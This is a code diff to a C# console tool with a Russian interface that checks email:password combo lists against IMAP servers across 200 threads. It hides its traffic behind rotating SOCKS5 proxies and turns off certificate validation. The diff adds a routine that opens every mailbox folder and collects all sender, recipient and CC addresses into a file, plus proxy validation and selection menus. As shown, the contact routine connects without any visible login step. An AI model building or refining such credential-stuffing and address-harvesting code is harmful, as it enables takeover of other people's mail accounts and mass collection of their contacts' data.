@@ -1,9 +1,10 @@
-﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿using System;
+﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Net;
+using System.Net.Sockets;
 using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
@@ -36,10 +37,12 @@ namespace opentask
         private string errorsFile = "errors.txt";
         private string results = "results.txt";
         private string proxyFile = "proxies.txt";
+        private string contactsFile = "extracted_contacts.txt";
         private int maxThreads = 200;
         private int connectTimeout = 10;
         private bool proxyEnabled = false;
         private ProxyManager? proxyManager;
+        private readonly object _contactsFileLock = new object(); // Потокобезопасная блокировка для записи в файл контактов
         
         // Новые поля для улучшенного функционала
         private bool isScanning = false;
@@ -72,10 +75,11 @@ namespace opentask
             string[] menuItems =
             {
                 "⚙️  Настройки",
-                "🚀 Запуск проверки",
+                "🚀 Запуск основной проверки",
+                "📧 Сбор всех контактов",
                 "📊 Просмотреть результаты",
                 "💾 Экспорт результатов",
-                "🔄 Обновить прокси",
+                "🔄 Выбор прокси",
                 "👀 Просмотреть валид аккаунты",
                 "❌ Выход"
             };
@@ -96,11 +100,12 @@ namespace opentask
                     {
                         case 0: await ShowSettingsMenu(); break;
                         case 1: await StartScanWithInterface(); break;
-                        case 2: await ShowRealTimeResults(); break;
-                        case 3: await ExportResults(); break;
-                        case 4: await UpdateProxies(); break;
-                        case 5: await ShowWorkingAccountsQuick(); break;
-                        case 6: return;
+                        case 2: await StartContactsCollection(); break;
+                        case 3: await ShowRealTimeResults(); break;
+                        case 4: await ExportResults(); break;
+                        case 5: await ShowProxySelectionMenu(); break;
+                        case 6: await ShowWorkingAccountsQuick(); break;
+                        case 7: return;
                     }
                 }
                 else if (key.Key == ConsoleKey.Q) break;
@@ -756,21 +761,166 @@ namespace opentask
             Console.WriteLine($"📂 Все файлы сохранены в папку {exportDir}");
         }
 
-        private Task UpdateProxies()
+private async Task ShowProxySelectionMenu()
+{
+    while (true)
+    {
+        Console.Clear();
+        DrawHeader("🔧 ВЫБОР ПРОКСИ", "Управление SOCKS5 прокси", 80);
+        
+        var allProxies = proxyManager?.GetAllProxies() ?? new List<string>();
+        HashSet<string> deadProxies = proxyManager?.GetDeadProxies() ?? new HashSet<string>();
+        var aliveCount = proxyManager?.GetAliveProxiesCount() ?? 0;
+        var selectedProxy = proxyManager?.GetSelectedProxy();
+
+        Console.WriteLine($"📁 Файл с прокси: {proxyFile}");
+        Console.WriteLine($"📊 Всего валидных SOCKS5 прокси: {allProxies.Count}");
+        Console.WriteLine($"✅ Живых прокси: {aliveCount}");
+        Console.WriteLine($"❌ Мертвых прокси: {deadProxies.Count}");
+        if (selectedProxy != null)
         {
-            Console.Clear();
-            DrawHeader("🔄 ОБНОВЛЕНИЕ ПРОКСИ", "Загрузка новых прокси", 80);
-            
-            Console.WriteLine("🌐 Функция обновления прокси будет реализована в следующей версии");
-            Console.WriteLine("📁 Сейчас используется файл: " + proxyFile);
-            
-            var proxyCount = File.Exists(proxyFile) ? File.ReadAllLines(proxyFile).Length : 0;
-            Console.WriteLine($"📊 Доступно прокси: {proxyCount}");
-            
-            Console.WriteLine("\nНажмите любую клавишу для возврата...");
-            Console.ReadKey();
-            return Task.CompletedTask;
+            Console.WriteLine($"🎯 Выбран ручной прокси: {selectedProxy}");
         }
+        else
+        {
+            Console.WriteLine("🔄 Используется автоматическая ротация прокси");
+        }
+
+        Console.WriteLine("\nДоступные действия:");
+        Console.WriteLine("1. Показать все прокси и выбрать один");
+        Console.WriteLine("2. Проверить все прокси на живучесть");
+        Console.WriteLine("3. Сбросить ручной выбор (вернуться к ротации)");
+        Console.WriteLine("4. Восстановить все мертвые прокси");
+        Console.WriteLine("5. Перезагрузить прокси из файла");
+        Console.WriteLine("ESC. Вернуться в главное меню");
+
+        var key = Console.ReadKey(true);
+        if (key.Key == ConsoleKey.Escape)
+        {
+            return;
+        }
+        else if (key.Key == ConsoleKey.D1)
+        {
+            await ShowProxyListAndSelect();
+        }
+        else if (key.Key == ConsoleKey.D2)
+        {
+            await TestAllProxies();
+        }
+        else if (key.Key == ConsoleKey.D3)
+        {
+            proxyManager?.SetManualProxy(null);
+            Console.WriteLine("\n✅ Ручной выбор прокси отключен");
+            Console.ReadKey();
+        }
+        else if (key.Key == ConsoleKey.D4)
+        {
+            proxyManager?.ReviveAllProxies();
+            Console.WriteLine("\n✅ Все прокси восстановлены");
+            Console.ReadKey();
+        }
+        else if (key.Key == ConsoleKey.D5)
+        {
+            proxyManager = new ProxyManager(proxyFile);
+            Console.WriteLine("\n✅ Прокси перезагружены из файла");
+            Console.ReadKey();
+        }
+    }
+}
+
+private async Task ShowProxyListAndSelect()
+{
+    var allProxies = proxyManager?.GetAllProxies() ?? new List<string>();
+    if (allProxies.Count == 0)
+    {
+        Console.WriteLine("\n❌ Нет загруженных прокси");
+        Console.ReadKey();
+        return;
+    }
+
+    int selected = 0;
+    while (true)
+    {
+        Console.Clear();
+        DrawHeader("📋 СПИСОК ПРОКСИ", "Выберите прокси для использования", 80);
+        
+        for (int i = 0; i < allProxies.Count; i++)
+        {
+            var isDead = proxyManager?.GetDeadProxies().Contains(allProxies[i]) ?? false;
+            var isSelected = i == selected;
+            var currentSelected = proxyManager?.GetSelectedProxy() == allProxies[i];
+
+            if (isSelected)
+            {
+                Console.BackgroundColor = ConsoleColor.Gray;
+                Console.ForegroundColor = ConsoleColor.Black;
+            }
+            else if (isDead)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+            }
+            else if (currentSelected)
+            {
+                Console.ForegroundColor = ConsoleColor.Green;
+            }
+
+            Console.WriteLine($"{(isSelected ? "> " : "  ")}{allProxies[i]} {(isDead ? "[МЕРТВ]" : "")}{(currentSelected ? "[АКТИВЕН]" : "")}");
+            Console.ResetColor();
+        }
+
+        var key = Console.ReadKey(true);
+        if (key.Key == ConsoleKey.Escape)
+        {
+            break;
+        }
+        else if (key.Key == ConsoleKey.UpArrow)
+        {
+            selected = (selected - 1 + allProxies.Count) % allProxies.Count;
+        }
+        else if (key.Key == ConsoleKey.DownArrow)
+        {
+            selected = (selected + 1) % allProxies.Count;
+        }
+        else if (key.Key == ConsoleKey.Enter)
+        {
+            var chosenProxy = allProxies[selected];
+            proxyManager?.SetManualProxy(chosenProxy);
+            
+            Console.WriteLine($"\n🔍 Проверяем прокси {chosenProxy}...");
+            var isOk = await proxyManager!.TestProxyAsync(chosenProxy, TimeSpan.FromSeconds(10));
+            if (isOk)
+            {
+                Console.WriteLine($"✅ Прокси {chosenProxy} работает и установлен как активный");
+            }
+            else
+            {
+                Console.WriteLine($"❌ Прокси {chosenProxy} не работает");
+            }
+            Console.ReadKey();
+            break;
+        }
+    }
+}
+
+private async Task TestAllProxies()
+{
+    var allProxies = proxyManager?.GetAllProxies() ?? new List<string>();
+    if (allProxies.Count == 0)
+    {
+        Console.WriteLine("\n❌ Нет загруженных прокси");
+        Console.ReadKey();
+        return;
+    }
+
+    Console.WriteLine("\n🚀 Начинаем проверку всех прокси...");
+    foreach (var proxy in allProxies)
+    {
+        await proxyManager!.TestProxyAsync(proxy, TimeSpan.FromSeconds(10));
+    }
+
+    Console.WriteLine($"\n✅ Проверка завершена! Живых: {proxyManager.GetAliveProxiesCount()}, мертвых: {proxyManager.GetDeadProxies().Count}");
+    Console.ReadKey();
+}
 
         private Task ShowWorkingAccountsQuick()
         {
@@ -2106,6 +2256,220 @@ namespace opentask
             return results;
         }
 
+        private async Task StartContactsCollection()
+        {
+            Console.Clear();
+            DrawHeader("📧 СБОР КОНТАКТОВ", "Извлечение всех email-адресов из почтовых ящиков", 80);
+            
+            // Сброс статистики
+            processedAccounts = 0;
+            validAccounts = 0;
+            isScanning = true;
+            
+            // Очищаем файл с контактами перед началом
+            if (File.Exists(contactsFile))
+                File.Delete(contactsFile);
+            
+            // Запускаем сбор контактов
+            await CollectAllContactsRealTime();
+            
+            isScanning = false;
+            Console.WriteLine("\n✅ Сбор контактов завершен!");
+            Console.WriteLine($"Всего извлечено уникальных контактов: {File.ReadAllLines(contactsFile).Length}");
+            Console.WriteLine("Нажмите любую клавишу для возврата в меню...");
+            Console.ReadKey();
+        }
+
+        private async Task CollectAllContactsRealTime()
+        {
+            scanStartTime = DateTime.Now;
+            
+            var rawAccounts = File.ReadAllLines(accountsFile).Where(l => !string.IsNullOrWhiteSpace(l)).Select(l => l.Trim()).ToList();
+            var accounts = new List<(string Email, string Password)>();
+            totalAccounts = rawAccounts.Count;
+            foreach (var l in rawAccounts)
+            {
+                var parts = l.Split(new[] { ':', ';' }, 2);
+                var email = parts[0].Trim();
+                var pass = parts.Length > 1 ? parts[1].Trim() : "";
+                if (!IsValidEmail(email)) continue;
+                accounts.Add((email, pass));
+            }
+
+            // Для потокобезопасного хранения уникальных контактов
+            var allContacts = new ConcurrentHashSet<string>();
+            var errors = new ConcurrentBag<string>();
+            var throttler = new SemaphoreSlim(maxThreads); // Исправляем многозадачность: SemaphoreSlim ограничивает количество одновременных потоков
+            int processed = 0;
+            var accountResults = new string[accounts.Count];
+            var colorResults = new ConsoleColor[accounts.Count];
+            var tasks = new List<Task>();
+            var printLock = new object();
+
+            // Запускаем задачу для отображения прогресса
+            var progressTask = ShowScanProgress();
+
+            // Обрабатываем каждый аккаунт параллельно с ограничением потоков
+            for (int i = 0; i < accounts.Count; i++)
+            {
+                int accIndex = i;
+                var acc = accounts[i];
+                
+                tasks.Add(Task.Run(async () =>
+                {
+                    await throttler.WaitAsync();
+                    try
+                    {
+                        string? proxyStr = proxyEnabled && proxyManager != null ? proxyManager.GetNextProxy() : null;
+                        // Используем уже работающий метод для подключения (как в основной проверке)
+                        var domain = acc.Email.Split('@')[1];
+                        var attempts = ImapHelper.GetImapDictionary();
+                        if (!attempts.ContainsKey(domain))
+                        {
+                            lock (printLock) { accountResults[accIndex] = $"❌ {acc.Email}: домен не поддерживается"; colorResults[accIndex] = ConsoleColor.Red; }
+                            return;
+                        }
+                        var imapSettings = attempts[domain];
+                        string server = imapSettings.Item1;
+                        int port = imapSettings.Item2;
+                        bool ssl = imapSettings.Item3;
+                        
+                        using var client = new ImapClient();
+                        client.ServerCertificateValidationCallback = (s, c, h, e) => true;
+                        
+                        try
+                        {
+                            var socketOptions = ssl ? SecureSocketOptions.SslOnConnect : SecureSocketOptions.StartTls;
+                            
+                            // Используем тот же способ подключения через прокси, что и в основной проверке
+                            if (proxyStr != null && proxyStr.StartsWith("socks5://"))
+                            {
+                                var cleanProxy = proxyStr.Replace("socks5://", "");
+                                var proxyParts = cleanProxy.Split(':');
+                                if (proxyParts.Length >= 2 && int.TryParse(proxyParts[1], out int proxyPort))
+                                {
+                                    var proxy = new MailKit.Net.Proxy.Socks5Client(proxyParts[0], proxyPort);
+                                    client.ProxyClient = proxy;
+                                }
+                            }
+                            
+                            // Подключаемся без лишних параметров
+                            await client.ConnectAsync(server, port, socketOptions);
+
+                            // Извлекаем все контакты из всех доступных папок
+                            var contacts = await ExtractAllContactsFromMailbox(client);
+                            foreach (var contact in contacts)
+                            {
+                                if (allContacts.Add(contact))
+                                {
+                                    lock (_contactsFileLock)
+                                    {
+                                        File.AppendAllText(contactsFile, $"{contact}{Environment.NewLine}");
+                                    }
+                                }
+                            }
+
+                            Interlocked.Increment(ref validAccounts);
+                            lock (printLock) { accountResults[accIndex] = $"✅ {acc.Email}: извлечено {contacts.Count} контактов"; colorResults[accIndex] = ConsoleColor.Green; }
+                        }
+                        catch (Exception ex)
+                        {
+                            lock (printLock) { accountResults[accIndex] = $"❌ {acc.Email}: {ex.Message.Substring(0, Math.Min(ex.Message.Length, 50))}"; colorResults[accIndex] = ConsoleColor.Red; }
+                            errors.Add($"{acc.Email}: {ex.Message}");
+                        }
+                        finally
+                        {
+                            if (client.IsConnected)
+                                await client.DisconnectAsync(true);
+                        }
+                    }
+                    finally
+                    {
+                        Interlocked.Increment(ref processedAccounts);
+                        throttler.Release();
+                    }
+                }));
+            }
+
+            await Task.WhenAll(tasks);
+            await progressTask;
+        }
+
+        private async Task<HashSet<string>> ExtractAllContactsFromMailbox(ImapClient client)
+        {
+            var contacts = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
+            var folders = client.GetFolders(client.PersonalNamespaces[0]);
+            
+            foreach (var folder in folders)
+            {
+                try
+                {
+                    if (!folder.IsOpen)
+                        await folder.OpenAsync(FolderAccess.ReadOnly);
+                    
+                    // Сканируем все сообщения (но не больше 1000 для производительности)
+                    var messageCount = folder.Count;
+                    if (messageCount == 0) continue;
+                    
+                    var startIndex = Math.Max(0, messageCount - 1000); // Последние 1000 сообщений, чтобы не перегружать
+                    var messageSummaries = await folder.FetchAsync(startIndex, -1, MessageSummaryItems.Envelope);
+                    
+                    foreach (var msg in messageSummaries)
+                    {
+                        // Добавляем отправителя (тот, кто писал на эту почту)
+                        if (msg.Envelope?.From != null)
+                        {
+                            foreach (var addr in msg.Envelope.From)
+                            {
+                                if (addr is MailboxAddress mailboxAddr && !string.IsNullOrWhiteSpace(mailboxAddr.Address) && IsValidEmail(mailboxAddr.Address))
+                                    contacts.Add(mailboxAddr.Address.ToLowerInvariant());
+                            }
+                        }
+                        
+                        // Добавляем получателей (те, кому писала эта почта)
+                        if (msg.Envelope?.To != null)
+                        {
+                            foreach (var addr in msg.Envelope.To)
+                            {
+                                if (addr is MailboxAddress mailboxAddr && !string.IsNullOrWhiteSpace(mailboxAddr.Address) && IsValidEmail(mailboxAddr.Address))
+                                    contacts.Add(mailboxAddr.Address.ToLowerInvariant());
+                            }
+                        }
+                        
+                        // Добавляем копии
+                        if (msg.Envelope?.Cc != null)
+                        {
+                            foreach (var addr in msg.Envelope.Cc)
+                            {
+                                if (addr is MailboxAddress mailboxAddr && !string.IsNullOrWhiteSpace(mailboxAddr.Address) && IsValidEmail(mailboxAddr.Address))
+                                    contacts.Add(mailboxAddr.Address.ToLowerInvariant());
+                            }
+                        }
+                    }
+                    
+                    await folder.CloseAsync();
+                }
+                catch
+                {
+                    // Игнорируем ошибки доступа к отдельным папкам
+                    continue;
+                }
+            }
+            
+            return contacts;
+        }
+
+        // Вспомогательный класс для потокобезопасного набора
+        private class ConcurrentHashSet<T> : HashSet<T>
+        {
+            private readonly object _lock = new object();
+            
+            public new bool Add(T item)
+            {
+                lock (_lock) return base.Add(item);
+            }
+        }
+
         private async Task ScanAllAccountsWithRealTime()
         {
             scanStartTime = DateTime.Now;
@@ -2131,7 +2495,7 @@ namespace opentask
 
             var workingAccounts = new ConcurrentBag<(string Record, Dictionary<string, int> Counts)>();
             var errors = new ConcurrentBag<string>();
-            var throttler = new SemaphoreSlim(maxThreads);
+            var throttler = new SemaphoreSlim(maxThreads); // Исправляем Semaphore: правильно ограничиваем количество потоков
             int processed = 0;
             int validCount = 0;
             int foundCount = 0;
@@ -2511,32 +2875,184 @@ namespace opentask
         }
     }
 
-    class ProxyManager
-    {
-        private readonly List<string> proxies = new List<string>();
-        private int pointer = 0;
+class ProxyManager
+{
+    private readonly List<string> validSocks5Proxies = new List<string>();
+    private readonly HashSet<string> deadProxies = new HashSet<string>();
+    private int pointer = 0;
+    private readonly object lockObj = new object();
+    private string? selectedManualProxy;
 
-        public ProxyManager(string file)
+    public ProxyManager(string file)
+    {
+        LoadAndValidateProxies(file);
+    }
+
+    private void LoadAndValidateProxies(string file)
+    {
+        validSocks5Proxies.Clear();
+        deadProxies.Clear();
+        
+        if (!File.Exists(file))
         {
-            if (File.Exists(file))
+            Console.WriteLine("[PROXY_ERROR] Файл с прокси не найден");
+            return;
+        }
+
+        var allLines = File.ReadAllLines(file).Where(x => !string.IsNullOrWhiteSpace(x)).Select(x => x.Trim()).ToList();
+        int invalidCount = 0;
+
+        foreach (var line in allLines)
+        {
+            if (ValidateSocks5Proxy(line, out string? validProxy))
             {
-                proxies = File.ReadAllLines(file).Where(x => !string.IsNullOrWhiteSpace(x)).Select(x => x.Trim()).ToList();
+                if (!validSocks5Proxies.Contains(validProxy!))
+                {
+                    validSocks5Proxies.Add(validProxy!);
+                }
+            }
+            else
+            {
+                invalidCount++;
+                Console.WriteLine($"[PROXY_WARN] Невалидный SOCKS5 прокси отброшен: {line}");
             }
         }
 
-        public string GetNextProxy()
+        Console.WriteLine($"[PROXY_INFO] Загружено {validSocks5Proxies.Count} валидных SOCKS5 прокси, отброшено {invalidCount} невалидных");
+    }
+
+    private bool ValidateSocks5Proxy(string proxyLine, out string? validProxy)
+    {
+        validProxy = null;
+        
+        string cleanProxy = proxyLine.Trim();
+        
+        if (cleanProxy.StartsWith("socks5://", StringComparison.OrdinalIgnoreCase))
         {
-            if (proxies.Count == 0)
-                return null;
-            int idx = Interlocked.Increment(ref pointer);
-            return proxies[(idx - 1) % proxies.Count];
+            cleanProxy = cleanProxy.Substring(9);
+        }
+        else if (cleanProxy.Contains("://"))
+        {
+            Console.WriteLine($"[PROXY_ERROR] Отклонен не-SOCKS5 прокси: {proxyLine} (только SOCKS5 поддерживаются)");
+            return false;
         }
 
-        public List<string> GetAllProxies()
+        var parts = cleanProxy.Split(':');
+        if (parts.Length < 2)
         {
-            return proxies;
+            return false;
+        }
+
+        if (!int.TryParse(parts[1], out int port) || port < 1 || port > 65535)
+        {
+            return false;
+        }
+
+        if (string.IsNullOrWhiteSpace(parts[0]))
+        {
+            return false;
+        }
+
+        validProxy = $"socks5://{cleanProxy}";
+        return true;
+    }
+
+    public string? GetNextProxy()
+    {
+        if (selectedManualProxy != null)
+        {
+            return selectedManualProxy;
+        }
+
+        lock (lockObj)
+        {
+            var availableProxies = validSocks5Proxies.Where(p => !deadProxies.Contains(p)).ToList();
+            if (availableProxies.Count == 0)
+            {
+                Console.WriteLine("[PROXY_ERROR] Нет доступных живых прокси");
+                return null;
+            }
+
+            int idx = Interlocked.Increment(ref pointer);
+            return availableProxies[(idx - 1) % availableProxies.Count];
         }
     }
+
+    public void SetManualProxy(string? proxy)
+    {
+        selectedManualProxy = proxy;
+        if (proxy != null)
+        {
+            Console.WriteLine($"[PROXY_INFO] Выбран ручной прокси: {proxy}");
+        }
+        else
+        {
+            Console.WriteLine("[PROXY_INFO] Ручной выбор прокси отключен, используется автоматическая ротация");
+        }
+    }
+
+    public string? GetSelectedProxy() => selectedManualProxy;
+
+    public void MarkProxyAsDead(string proxy)
+    {
+        lock (lockObj)
+        {
+            if (!deadProxies.Contains(proxy))
+            {
+                deadProxies.Add(proxy);
+                Console.WriteLine($"[PROXY_ERROR] Прокси помечен как мертвый: {proxy}, осталось живых: {validSocks5Proxies.Count - deadProxies.Count}");
+            }
+        }
+    }
+
+    public void ReviveAllProxies()
+    {
+        lock (lockObj)
+        {
+            deadProxies.Clear();
+            Console.WriteLine("[PROXY_INFO] Все прокси восстановлены");
+        }
+    }
+
+    public async Task<bool> TestProxyAsync(string proxy, TimeSpan timeout)
+    {
+        try
+        {
+            var proxyParts = proxy.Replace("socks5://", "").Split(':');
+            if (proxyParts.Length < 2) return false;
+
+            string host = proxyParts[0];
+            int port = int.Parse(proxyParts[1]);
+
+            using var cts = new CancellationTokenSource(timeout);
+            using var client = new TcpClient();
+            var connectTask = client.ConnectAsync(host, port, cts.Token).AsTask(); // добавили .AsTask()
+            var completedTask = await Task.WhenAny(connectTask, Task.Delay(timeout, cts.Token));
+            if (completedTask == connectTask && client.Connected)
+            {
+                Console.WriteLine($"[PROXY_OK] Прокси работает: {proxy}");
+                client.Close();
+                return true;
+            }
+            else
+            {
+                Console.WriteLine($"[PROXY_FAIL] Прокси не отвечает: {proxy}");
+                MarkProxyAsDead(proxy);
+                return false;
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"[PROXY_FAIL] Прокси {proxy} не прошел проверку: {ex.Message}");
+            MarkProxyAsDead(proxy);
+            return false;
+        }
+    }
+
+    public List<string> GetAllProxies() => validSocks5Proxies.ToList();
+    public HashSet<string> GetDeadProxies() => deadProxies;
+    public int GetAliveProxiesCount() => validSocks5Proxies.Count - deadProxies.Count;
+}
 
     static class ImapHelper
     {
@@ -2827,12 +3343,13 @@ namespace opentask
                 {
                     client = new ImapClient();
                     client.ServerCertificateValidationCallback = (a, b, c, d) => true;
-                    if (!string.IsNullOrEmpty(s.proxy))
+                   if (!string.IsNullOrEmpty(s.proxy) && s.proxy.StartsWith("socks5://"))
                     {
-                        var proxyParts = s.proxy.Split(':');
-                        if (proxyParts.Length >= 2)
+                        var cleanProxy = s.proxy.Replace("socks5://", "");
+                        var proxyParts = cleanProxy.Split(':');
+                        if (proxyParts.Length >= 2 && int.TryParse(proxyParts[1], out int port))
                         {
-                            var proxy = new MailKit.Net.Proxy.HttpProxyClient(proxyParts[0], int.Parse(proxyParts[1]));
+                            var proxy = new MailKit.Net.Proxy.Socks5Client(proxyParts[0], port);
                             client.ProxyClient = proxy;
                         }
                     }
@@ -3028,6 +3545,5 @@ namespace opentask
             return "";
         }
 
-        // Оптимизированные методы для улучшенной эффективности будут добавлены позже
     }
 }
